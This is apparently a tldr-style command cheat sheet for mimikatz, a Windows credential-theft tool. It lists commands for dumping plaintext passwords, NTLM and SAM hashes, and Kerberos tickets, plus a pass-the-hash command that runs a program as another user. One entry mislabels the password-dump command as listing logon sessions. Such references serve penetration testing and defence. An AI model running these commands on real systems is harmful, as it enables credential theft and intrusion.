# mimikatz

> Interact with Windows credentials, perform credential dumping, token manipulation, and more.
> Requires administrator privileges and typically runs on Windows.
> More information: <https://github.com/gentilkiwi/mimikatz>.

- Run mimikatz in interactive mode:

`mimikatz`

- Enable debug privileges (needed for most operations):

`mimikatz "privilege::debug"`

- List available logon sessions:

`mimikatz "sekurlsa::logonpasswords"`

- Dump plaintext passwords, NTLM hashes, and Kerberos tickets from memory:

`mimikatz "sekurlsa::logonpasswords"`

- Pass-the-Hash with a specific NTLM hash and launch a command:

`mimikatz "sekurlsa::pth /user:{{username}} /domain:{{domain}} /ntlm:{{hash}} /run:{{cmd}}"`

- Dump local SAM database hashes:

`mimikatz "lsadump::sam"`

- Extract Kerberos tickets and export to a file:

`mimikatz "kerberos::list /export"`

- Exit mimikatz:

`exit`
